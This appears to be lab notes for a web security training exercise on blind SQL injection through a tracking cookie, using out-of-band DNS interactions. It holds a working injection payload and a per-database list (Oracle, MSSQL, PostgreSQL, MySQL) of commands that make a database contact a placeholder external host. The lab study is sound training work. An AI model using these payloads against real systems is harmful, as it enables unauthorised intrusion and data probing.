--The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
--The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. 
       
--Exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

--Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

--Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
    
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


'--You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate 
--a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

--Oracle	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

--The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

--Microsoft	
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

--PostgreSQL	
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 
--MySQL	The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
